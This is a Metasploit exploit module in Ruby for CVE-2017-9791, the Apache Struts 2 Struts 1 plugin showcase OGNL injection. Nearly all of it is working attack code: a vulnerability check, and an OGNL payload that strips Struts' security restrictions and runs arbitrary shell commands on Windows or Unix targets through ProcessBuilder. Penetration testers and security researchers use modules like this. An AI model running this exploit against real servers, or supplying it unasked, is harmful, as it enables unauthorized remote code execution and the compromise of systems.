# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution&#039;,
      &#039;Description&#039;    => %q{ This module exploits a remote code execution vulnerability in the Struts Showcase app in the Struts 1 plugin example in Struts 2.3.x series. Remote Code Execution can be performed via a malicious field value. },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => [
        &#039;icez <ic3z at qq dot com>&#039;,
        &#039;Nixawk&#039;,
        &#039;xfer0&#039;
      ],
      &#039;References&#039;     => [
        [ &#039;CVE&#039;, &#039;2017-9791&#039; ],
        [ &#039;BID&#039;, &#039;99484&#039; ],
        [ &#039;EDB&#039;, &#039;42324&#039; ],
        [ &#039;URL&#039;, &#039;https://cwiki.apache.org/confluence/display/WW/S2-048&#039;  ]
      ],
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        => [
        [
          &#039;Universal&#039;, {
            &#039;Platform&#039;       => %w{ linux unix win },
            &#039;Arch&#039;           => [ ARCH_CMD ]
          }
        ]
      ],
      &#039;DisclosureDate&#039; => &#039;Jul 07 2017&#039;,
    &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        Opt::RPORT(8080),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to a struts application action&#039;, &#039;/struts2-showcase/integration/saveGangster.action&#039; ]),
        OptString.new(&#039;POSTPARAM&#039;, [ true, &#039;The HTTP POST parameter&#039;, &#039;name&#039; ])
      ]
    )
  end
 
  def send_struts_request(ognl)
    var_a = rand_text_alpha_lower(4)
    var_b = rand_text_alpha_lower(4)
    uri = normalize_uri(datastore[&#039;TARGETURI&#039;])
 
    data = {
      datastore[&#039;POSTPARAM&#039;]    => ognl,
      &#039;age&#039;                     => var_a,
      &#039;__checkbox_bustedBefore&#039; => &#039;true&#039;,
      &#039;description&#039;             => var_b
    }
 
    resp = send_request_cgi({
      &#039;uri&#039;       => uri,
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;vars_post&#039; => data
    })
 
    if resp && resp.code == 404
      fail_with(Failure::BadConfig, &#039;Server returned HTTP 404, please double check TARGETURI&#039;)
    end
    resp
  end
 
  def check
    var_a = rand_text_alpha_lower(4)
    var_b = rand_text_alpha_lower(4)
    ognl = "%{&#039;#{var_a}&#039; + &#039;#{var_b}&#039;}"
 
    begin
      resp = send_struts_request(ognl)
    rescue Msf::Exploit::Failed
      return Exploit::CheckCode::Unknown
    end
 
    if resp && resp.code == 200 && resp.body.include?("#{var_a}#{var_b}")
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end
 
  def exploit
    resp = exec_cmd(payload.encoded)
    unless resp and resp.code == 200
      fail_with(Failure::Unknown, "Exploit failed.")
    end
 
    print_good("Command executed")
    print_line(resp.body)
  end
 
  def exec_cmd(cmd)
    ognl = "%{(#_=&#039;multipart/form-data&#039;)."
    ognl << "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    ognl << "(#_memberAccess?(#_memberAccess=#dm):"
    ognl << "((#container=#context[&#039;com.opensymphony.xwork2.ActionContext.container&#039;])."
    ognl << "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    ognl << "(#ognlUtil.getExcludedPackageNames().clear())."
    ognl << "(#ognlUtil.getExcludedClasses().clear())."
    ognl << "(#context.setMemberAccess(#dm))))."
    ognl << "(#cmd=&#039;#{cmd}&#039;)."
    ognl << "(#iswin=(@java.lang.System@getProperty(&#039;os.name&#039;).toLowerCase().contains(&#039;win&#039;))).(#cmds=(#iswin?{&#039;cmd.exe&#039;,&#039;/c&#039;,#cmd}:{&#039;/bin/bash&#039;,&#039;-c&#039;,#cmd}))."
    ognl << "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())."
    ognl << "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    ognl << "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
 
    send_struts_request(ognl)
  end
end

